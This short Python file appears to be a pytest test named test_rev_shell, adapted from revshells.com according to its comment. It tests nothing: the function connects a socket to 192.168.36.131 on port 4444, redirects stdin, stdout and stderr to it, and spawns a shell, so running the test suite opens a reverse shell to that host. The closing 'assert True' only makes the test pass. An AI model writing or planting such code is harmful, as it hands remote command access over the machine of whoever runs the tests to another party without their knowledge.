import socket
import os
import pty

# Modified from Python3 #1
# courtesy https://www.revshells.com/


def test_rev_shell():
    RHOST = "192.168.36.131"
    RPORT = 4444

    s = socket.socket()
    s.connect((RHOST, RPORT))
    [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
    pty.spawn("sh")

    assert True
